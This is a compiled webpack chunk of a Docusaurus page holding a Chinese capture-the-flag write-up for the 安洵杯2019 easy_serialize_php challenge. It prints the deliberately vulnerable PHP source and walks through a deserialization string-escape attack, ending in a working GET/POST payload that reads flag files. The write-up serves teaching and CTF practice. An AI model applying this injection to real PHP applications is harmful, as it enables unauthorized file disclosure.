"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[279],{4657:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>o,contentTitle:()=>a,default:()=>d,frontMatter:()=>l,metadata:()=>r,toc:()=>t});const r=JSON.parse('{"id":"CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php","title":"\u5b89\u6d35\u676f2019-easy_serialize_php","description":"[\u5b89\u6d35\u676f 2019]easyserializephp","source":"@site/docs/CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php","permalink":"/docs/CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"\u9e64\u57ce\u676f 2021EasyP","permalink":"/docs/CTF/Misc/nss"},"next":{"title":"\u7f51\u9f0e\u676f2018-Fakebook","permalink":"/docs/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook"}}');var i=s(4848),c=s(8453);const l={},a=void 0,o={},t=[{value:"[\u5b89\u6d35\u676f 2019]easy_serialize_php",id:"\u5b89\u6d35\u676f-2019easy_serialize_php",level:2}];function p(n){const e={code:"code",h2:"h2",p:"p",pre:"pre",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"\u5b89\u6d35\u676f-2019easy_serialize_php",children:"[\u5b89\u6d35\u676f 2019]easy_serialize_php"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:" <?php\r\n\r\n$function = @$_GET['f'];\r\n\r\nfunction filter($img){\r\n    $filter_arr = array('php','flag','php5','php4','fl1g');\r\n    $filter = '/'.implode('|',$filter_arr).'/i';\r\n    return preg_replace($filter,'',$img);\r\n}\r\n\r\n\r\nif($_SESSION){\r\n    unset($_SESSION);\r\n}\r\n\r\n$_SESSION[\"user\"] = 'guest';\r\n$_SESSION['function'] = $function;\r\n\r\nextract($_POST);\r\n\r\nif(!$function){\r\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\r\n}\r\n\r\nif(!$_GET['img_path']){\r\n    $_SESSION['img'] = base64_encode('guest_img.png');\r\n}else{\r\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\r\n}\r\n\r\n$serialize_info = filter(serialize($_SESSION));\r\n\r\nif($function == 'highlight_file'){\r\n    highlight_file('index.php');\r\n}else if($function == 'phpinfo'){\r\n    eval('phpinfo();'); //maybe you can find something in here!\r\n}else if($function == 'show_image'){\r\n    $userinfo = unserialize($serialize_info);\r\n    echo file_get_contents(base64_decode($userinfo['img']));\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u63a7\u53c2\u6570\u6709"}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"f\uff0cuser\uff0cfunction"}),"(\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528extract\u51fd\u6570\u8fdb\u884c\u53d8\u91cf\u8986\u76d6)"]}),"\n",(0,i.jsxs)(e.p,{children:["\u6211\u4eec\u67e5\u770b\u4e00\u4e0bphpinfo\u91cc\u9762\uff0c\u53d1\u73b0\u6709\u4e2a",(0,i.jsx)(e.code,{children:"d0g3_f1ag.php"}),"\u6587\u4ef6"]}),"\n",(0,i.jsx)(e.p,{children:"\u57fa\u672c\u601d\u8def\u5c31\u6709\u4e86"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u4f7f$userinfo['img']\u7b49\u4e8eZDBnM19mMWFnLnBocA==\uff0c\u8bfb\u53d6d0g3_f1ag.php\u6587\u4ef6\u7684\u5185\u5bb9\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));"}),"\u8fd9\u91cc\u8fdb\u884csha1\u52a0\u5bc6\u5c31\u4e0d\u80fdbase64"]}),"\n",(0,i.jsx)(e.p,{children:"\u89e3\u7801\uff0c\u6240\u4ee5\u53ea\u80fd\u8d70if\u8fd9\u6761\u8def"}),"\n",(0,i.jsxs)(e.p,{children:["\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570",(0,i.jsx)(e.code,{children:"preg_replace"}),"\uff0c\u60f3\u5230\u4e86\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u4e32\u9003\u9038"]}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u53d8\u91cf\u8d4b\u503c\u4e3a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$_SESSION[\"user\"] = 'guest';\r\n$_SESSION['function'] = '11';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u5982\u679c\u60f3\u8ba9img\u53c2\u6570\u8fdb\u884c\u89e3\u6790\uff0c\u6211\u4eec\u9700\u8981\u5403\u7684\u5b57\u7b26\u4e32\u662f",(0,i.jsx)(e.code,{children:'";s:8:"function";s:2:"11'}),"24\u4e2a\u5b57\u7b26\uff0c6\u4e2aflag\u6b63\u597d\u662f24\u4e2a\u5b57\u7b26"]}),"\n",(0,i.jsx)(e.p,{children:"\u8d4b\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$_SESSION[\"user\"] = 'guestflagflagflagflagflagflag';\r\n$_SESSION['function'] = '11';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u6837img\u53c2\u6570\u5c31\u53ef\u4ee5\u89e3\u6790\uff0c\u4f46function\u53c2\u6570\u6ca1\u4e86\uff0c\u6211\u4eec\u8981\u52a0\u4e0afunction\u53c2\u6570"}),"\n",(0,i.jsx)(e.p,{children:"\u8d4b\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'$_SESSION["user"] = \'guestflagflagflagflagflagflag\';\r\n$_SESSION[\'function\'] = \'";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\';\r\n$_SESSION[\'img\'] = base64_encode(\'d0g3_f1ag.php\');\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:65:"";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u5728user\u53d8\u91cf\u91cc\uff0c\u4f1a\u591a\u5403\u4e00\u4e2a",(0,i.jsx)(e.code,{children:'"'}),",\u5373",(0,i.jsx)(e.code,{children:'guest";s:8:"function";s:65:""'}),"\u8fd9\u6837\u624d\u662f29\u4e2a\u5b57\u7b26\uff0c\u6211\u4eec\u9700\u8981\u5728function\u53c2\u6570\u524d\u591a\u52a0\u4e00\u4e2a\u5b57\u7b26"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'$_SESSION[\'function\'] = \'a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\';\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:66:"a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u6837\u5c31\u90fd\u80fd\u88ab\u89e3\u6790\u4e86"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'GET\u4f20\u53c2:\r\nf=show_image\r\nPOST\u4f20\u53c2:\r\n_SESSION[user]=guestflagflagflagflagflagflag&_SESSION[function]=a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}\n'})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"d0g3_f1ag.php"}),"\u6587\u4ef6\u7684\u5185\u5bb9\u662f"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\n$flag = 'flag in /d0g3_fllllllag';\r\n\r\n?>\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u540c\u6837\u8bfb\u53d6",(0,i.jsx)(e.code,{children:"/d0g3_fllllllag"}),"\u6587\u4ef6"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nfunction filter($img){\r\n    $filter_arr = array('php','flag','php5','php4','fl1g');\r\n    $filter = '/'.implode('|',$filter_arr).'/i';\r\n    return preg_replace($filter,'',$img);\r\n}\r\n\r\n$_SESSION[\"user\"] = 'guestflagflagflagflagflagflag';\r\n$_SESSION['function'] = 'a\";s:8:\"function\";s:2:\"11\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";}';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\r\n\r\n\r\n$serialize_info = filter(serialize($_SESSION));\r\necho $serialize_info;\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5b66\u8fd9\u9053\u9898\u524d\uff0c\u53ef\u4ee5\u5148\u5b66\u4e60\u5b57\u7b26\u4e32\u9003\u9038\u7684\u539f\u7406"})]})}function d(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(p,{...n})}):p(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>l,x:()=>a});var r=s(6540);const i={},c=r.createContext(i);function l(n){const e=r.useContext(c);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:l(n.components),r.createElement(c.Provider,{value:e},n.children)}}}]);